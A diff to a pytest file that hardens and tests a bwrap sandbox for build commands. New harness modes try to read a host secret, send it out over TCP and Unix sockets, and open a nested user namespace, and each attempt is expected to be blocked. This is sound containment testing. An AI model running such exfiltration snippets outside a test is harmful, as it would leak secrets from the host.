@@ -8,6 +8,7 @@ import importlib.metadata
 import json
 import os
 import shutil
+import socket
 import stat
 import subprocess
 import sys
@@ -3517,7 +3518,7 @@ def test_p2_idempotency_postgres_gate_uses_wrapper_owned_result_validation(
         f"APPEND_MARKER={json.dumps(str(tmp_path / 'append-marker'))}\n"
         'mkdir -p "$NODE_EVIDENCE"\n'
         'append_record() { printf \'%s\\n\' "$*" >"$APPEND_MARKER"; }\n'
-        'die() { printf \'%s\\n\' "$*" >&2; exit 2; }\n'
+        "die() { printf '%s\\n' \"$*\" >&2; exit 2; }\n"
         f"{trusted_parent_gate}\n"
         'run_trusted_parent_postgres_gate CP "$PWD/packages/acgs-control-plane" '
         "p2-idempotency-postgres "
@@ -5134,6 +5135,8 @@ def test_clean_sibling_hash_locked_bootstraps_and_round_trip(tmp_path: Path) -> 
     assert "attestations=pending-independent-lanes" in cleanup_source
     assert '  exit "$?"\nfi' in source
     assert "  exit 2\nfi" not in source
+    assert '"$ACGS_GUARDIAN_PARENT_EXE" == /usr/bin/bash' in source
+    assert '"$ACGS_GUARDIAN_PARENT_EXE" == /bin/bash' in source
     assert '"$T^"' not in source
     assert "attest.py" not in source and "PRIVATE_ROOT" not in source
     assert "bash -c" not in source and "sh -c" not in source and "python -c" not in source
@@ -7218,8 +7221,7 @@ exit $?
     )
     assert cleanup_result.returncode == 2
     assert (
-        "cleanup refused because retained worktree gitfile moved/replaced"
-        in cleanup_result.stderr
+        "cleanup refused because retained worktree gitfile moved/replaced" in cleanup_result.stderr
     )
     assert "CLEAN_SIBLING_TECHNICAL=PASS" not in cleanup_result.stdout
     assert cleanup_root.is_dir()
@@ -8010,18 +8012,53 @@ def test_clean_sibling_target_commands_are_forced_through_bwrap_containment() ->
     runner = _shell_function(source, "run_contained")
     bootstrap_runner = _shell_function(source, "run_contained_bootstrap")
     mounts = _shell_function(source, "contained_mount_args")
+    system_mounts = _shell_function(source, "runtime_system_mount_args")
+    linker_args = _shell_function(source, "runtime_linker_args")
+    bootstrap_mounts = _shell_function(source, "bootstrap_mount_args")
     assert "BWRAP_BIN=/usr/bin/bwrap" in source
     assert "die 'containment runner unavailable: /usr/bin/bwrap'" in source
     assert "--die-with-parent" in runner
-    assert "--unshare-pid" in runner
+    for flag in (
+        "--unshare-all",
+        "--unshare-user",
+        "--unshare-ipc",
+        "--unshare-net",
+        "--new-session",
+        "--disable-userns",
+    ):
+        assert flag in runner
     assert 'for fd_path in /proc/"$BASHPID"/fd/*' in runner
-    assert "--ro-bind / /" in runner
+    assert "--ro-bind / /" not in runner
     assert "--tmpfs /tmp" in runner
     assert "--tmpfs /run" in runner
     assert "--dir /run/service" in runner
+    for runtime_mount in (
+        "--ro-bind /usr /usr",
+        "--ro-bind /bin /bin",
+        "--ro-bind-try /lib /lib",
+        "--ro-bind-try /lib64 /lib64",
+        '--ro-bind "$UV_BIN" "$UV_BIN"',
+    ):
+        assert runtime_mount in runner
     assert 'printf \'%s\\0%s\\0%s\\0\' --ro-bind "$WORKTREE" "$WORKTREE"' in mounts
+    assert (
+        'printf \'%s\\0%s\\0%s\\0\' --ro-bind "$SOURCE_GIT_COMMON_DIR" "$SOURCE_GIT_COMMON_DIR"'
+    ) in mounts
     assert "unset UV_OFFLINE UV_NO_INDEX UV_NO_CACHE RUFF_NO_CACHE" in bootstrap_runner
-    assert 'run_contained "$@"' in bootstrap_runner
+    assert 'run_contained "$@"' not in bootstrap_runner
+    assert '[[ "${1:-}" == "$UV_BIN" ]]' in bootstrap_runner
+    assert "--unshare-net" not in bootstrap_runner
+    assert "--unshare-ipc" in bootstrap_runner
+    assert "--disable-userns" in bootstrap_runner
+    assert "bootstrap_mount_args" in bootstrap_runner
+    assert "/etc/passwd" in system_mounts
+    assert "/etc/group" in system_mounts
+    assert "/etc/nsswitch.conf" in system_mounts
+    assert "/etc/shadow" not in system_mounts
+    assert "--dir /etc/alternatives" in linker_args
+    assert "--symlink /usr/bin/ld.bfd /etc/alternatives/ld" in linker_args
+    assert "/etc/resolv.conf" in bootstrap_mounts
+    assert "/etc/pki" in bootstrap_mounts
     writable_mounts = {
         '"$EVIDENCE_ROOT"',
         '"$SCRATCH_ROOT"',
@@ -8032,6 +8069,10 @@ def test_clean_sibling_target_commands_are_forced_through_bwrap_containment() ->
     for path in writable_mounts:
         assert path in mounts
     assert mounts.count('printf \'%s\\0%s\\0%s\\0\' --bind "$path" "$path"') == 1
+    assert (
+        'run_contained "$WORKTREE" \\\n  /usr/bin/python3 \\\n  '
+        "scripts/evidence/render_lock_inputs.py" in source
+    )
     assert 'run_contained_bootstrap "$WORKTREE" "$UV_BIN" python install 3.11' in source
     assert 'run_contained_bootstrap "$WORKTREE" "$UV_BIN" pip sync' in source
     assert 'run_contained "$WORKTREE" "$UV_BIN" pip install' in source
@@ -8055,9 +8096,14 @@ def test_clean_sibling_bwrap_containment_denies_host_writes_fds_double_fork_and_
         (
             _shell_function(source, "contained_env_args"),
             _shell_function(source, "contained_mount_args"),
+            _shell_function(source, "runtime_system_mount_args"),
+            _shell_function(source, "runtime_linker_args"),
             _shell_function(source, "run_contained"),
         )
     )
+    host_secret = tmp_path / "host-secret.txt"
+    host_secret.write_text("host-readable-sentinel", encoding="utf-8")
+    unix_socket_path = tmp_path / "host-service.sock"
     harness = tmp_path / "containment-harness.sh"
     harness.write_text(
         "#!/usr/bin/env bash\n"
@@ -8065,9 +8111,11 @@ def test_clean_sibling_bwrap_containment_denies_host_writes_fds_double_fork_and_
         "die() { printf 'HARNESS_DIE=%s\\n' \"$*\" >&2; exit 2; }\n"
         "BWRAP_BIN=/usr/bin/bwrap\n"
         "PATH=/usr/bin:/bin\n"
+        "UV_BIN=/usr/bin/true\n"
         "LANG=C.UTF-8\n"
         "LC_ALL=C.UTF-8\n"
         f"WORKTREE={json.dumps(str(tmp_path / 'product'))}\n"
+        f"SOURCE_GIT_COMMON_DIR={json.dumps(str(tmp_path / 'git-common'))}\n"
         f"EVIDENCE_ROOT={json.dumps(str(tmp_path / 'evidence'))}\n"
         f"SCRATCH_ROOT={json.dumps(str(tmp_path / 'scratch'))}\n"
         'TMPDIR="$SCRATCH_ROOT/tmp"\n'
@@ -8078,49 +8126,83 @@ def test_clean_sibling_bwrap_containment_denies_host_writes_fds_double_fork_and_
         'XDG_CONFIG_HOME="$SCRATCH_ROOT/xdg-config"\n'
         'XDG_DATA_HOME="$SCRATCH_ROOT/xdg-data"\n'
         'XDG_STATE_HOME="$SCRATCH_ROOT/xdg-state"\n'
-        'PYTHONDONTWRITEBYTECODE=1\n'
-        'PYTHONNOUSERSITE=1\n'
-        'export PATH LANG LC_ALL WORKTREE EVIDENCE_ROOT SCRATCH_ROOT TMPDIR TMP TEMP HOME '
-        'XDG_CACHE_HOME XDG_CONFIG_HOME XDG_DATA_HOME XDG_STATE_HOME '
-        'PYTHONDONTWRITEBYTECODE PYTHONNOUSERSITE\n'
-        'mkdir -p "$WORKTREE/.venv-evidence" "$EVIDENCE_ROOT" "$SCRATCH_ROOT" '
+        "PYTHONDONTWRITEBYTECODE=1\n"
+        "PYTHONNOUSERSITE=1\n"
+        "export PATH LANG LC_ALL UV_BIN WORKTREE SOURCE_GIT_COMMON_DIR EVIDENCE_ROOT "
+        "SCRATCH_ROOT TMPDIR TMP TEMP HOME "
+        "XDG_CACHE_HOME XDG_CONFIG_HOME XDG_DATA_HOME XDG_STATE_HOME "
+        "PYTHONDONTWRITEBYTECODE PYTHONNOUSERSITE\n"
+        'mkdir -p "$WORKTREE/.venv-evidence" "$SOURCE_GIT_COMMON_DIR" '
+        '"$EVIDENCE_ROOT" "$SCRATCH_ROOT" '
         '"$TMPDIR" "$HOME" "$XDG_CACHE_HOME" "$XDG_CONFIG_HOME" "$XDG_DATA_HOME" '
         '"$XDG_STATE_HOME"\n'
         f"{functions}\n"
         'case "${1:-}" in\n'
-        '  unavailable)\n'
+        "  unavailable)\n"
         '    BWRAP_BIN="$SCRATCH_ROOT/missing-bwrap"\n'
         '    run_contained "$WORKTREE" /usr/bin/true\n'
-        '    ;;\n'
-        '  host-write)\n'
+        "    ;;\n"
+        "  host-write)\n"
         '    if run_contained "$WORKTREE" /usr/bin/bash --noprofile --norc -c '
         + json.dumps(
-            'set -u; '
+            "set -u; "
             'if printf bad >"$WORKTREE/host-write" 2>/dev/null; then exit 80; fi; '
             'printf ok >"$SCRATCH_ROOT/scratch-ok"; '
             'printf ok >"$EVIDENCE_ROOT/evidence-ok"; '
             'printf ok >"$WORKTREE/.venv-evidence/venv-ok"; '
-            'test ! -e /run/docker.sock; '
-            'test ! -e /run/service/docker.sock'
+            "test ! -e /run/docker.sock; "
+            "test ! -e /run/service/docker.sock"
         )
         + '; then test ! -e "$WORKTREE/host-write"; else exit "$?"; fi\n'
-        '    ;;\n'
-        '  inherited-fd)\n'
+        "    ;;\n"
+        "  inherited-fd)\n"
         '    exec 9>"$SCRATCH_ROOT/host-fd-target"\n'
         '    run_contained "$WORKTREE" /usr/bin/bash --noprofile --norc -c '
-        + json.dumps('if printf leak >&9 2>/dev/null; then exit 81; fi; exit 0')
-        + '\n'
+        + json.dumps("if printf leak >&9 2>/dev/null; then exit 81; fi; exit 0")
+        + "\n"
         '    [[ ! -s "$SCRATCH_ROOT/host-fd-target" ]]\n'
-        '    ;;\n'
-        '  double-fork)\n'
+        "    ;;\n"
+        "  double-fork)\n"
         '    run_contained "$WORKTREE" /usr/bin/bash --noprofile --norc -c '
         + json.dumps('( ( sleep 1; printf late >"$SCRATCH_ROOT/late" ) & ); exit 0')
-        + '\n'
-        '    sleep 2\n'
+        + "\n"
+        "    sleep 2\n"
         '    [[ ! -e "$SCRATCH_ROOT/late" ]]\n'
-        '    ;;\n'
-        '  *) exit 64 ;;\n'
-        'esac\n',
+        "    ;;\n"
+        "  host-read)\n"
+        '    if run_contained "$WORKTREE" /usr/bin/bash --noprofile --norc -c '
+        + json.dumps(f"if cat {str(host_secret)!r} >/dev/null 2>&1; then exit 82; fi")
+        + '; then :; else exit "$?"; fi\n'
+        "    ;;\n"
+        "  tcp-exfil)\n"
+        '    if run_contained "$WORKTREE" /usr/bin/bash --noprofile --norc -c '
+        + json.dumps(
+            "/usr/bin/python3 -c 'import pathlib,socket,sys; "
+            "secret=pathlib.Path(sys.argv[2]).read_bytes(); "
+            's=socket.create_connection(("127.0.0.1", int(sys.argv[1])), timeout=1); '
+            "s.sendall(secret)' "
+            f'"$1" {str(host_secret)!r} && exit 83; exit 0'
+        )
+        + ' -- "$2"; then :; else exit "$?"; fi\n'
+        "    ;;\n"
+        "  unix-exfil)\n"
+        '    if run_contained "$WORKTREE" /usr/bin/bash --noprofile --norc -c '
+        + json.dumps(
+            "/usr/bin/python3 -c 'import pathlib,socket,sys; "
+            "secret=pathlib.Path(sys.argv[2]).read_bytes(); "
+            "s=socket.socket(socket.AF_UNIX); s.settimeout(1); s.connect(sys.argv[1]); "
+            "s.sendall(secret)' "
+            f"{str(unix_socket_path)!r} {str(host_secret)!r} && exit 84; exit 0"
+        )
+        + '; then :; else exit "$?"; fi\n'
+        "    ;;\n"
+        "  nested-userns)\n"
+        '    if run_contained "$WORKTREE" /usr/bin/bash --noprofile --norc -c '
+        + json.dumps("if /usr/bin/unshare -Ur true >/dev/null 2>&1; then exit 85; fi")
+        + '; then :; else exit "$?"; fi\n'
+        "    ;;\n"
+        "  *) exit 64 ;;\n"
+        "esac\n",
         encoding="utf-8",
     )
     harness.chmod(0o755)
@@ -8134,7 +8216,7 @@ def test_clean_sibling_bwrap_containment_denies_host_writes_fds_double_fork_and_
     assert unavailable.returncode == 2
     assert "containment runner unavailable" in unavailable.stderr
 
-    for mode in ("host-write", "inherited-fd", "double-fork"):
+    for mode in ("host-write", "inherited-fd", "double-fork", "host-read", "nested-userns"):
         result = subprocess.run(
             [str(harness), mode],
             text=True,
@@ -8142,3 +8224,32 @@ def test_clean_sibling_bwrap_containment_denies_host_writes_fds_double_fork_and_
             check=False,
         )
         assert result.returncode == 0, (mode, result.stdout, result.stderr)
+
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tcp_server:
+        tcp_server.bind(("127.0.0.1", 0))
+        tcp_server.listen(1)
+        tcp_server.settimeout(0.5)
+        port = tcp_server.getsockname()[1]
+        result = subprocess.run(
+            [str(harness), "tcp-exfil", str(port)],
+            text=True,
+            capture_output=True,
+            check=False,
+        )
+        assert result.returncode == 0, (result.stdout, result.stderr)
+        with pytest.raises(TimeoutError):
+            tcp_server.accept()
+
+    with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as unix_server:
+        unix_server.bind(str(unix_socket_path))
+        unix_server.listen(1)
+        unix_server.settimeout(0.5)
+        result = subprocess.run(
+            [str(harness), "unix-exfil"],
+            text=True,
+            capture_output=True,
+            check=False,
+        )
+        assert result.returncode == 0, (result.stdout, result.stderr)
+        with pytest.raises(TimeoutError):
+            unix_server.accept()
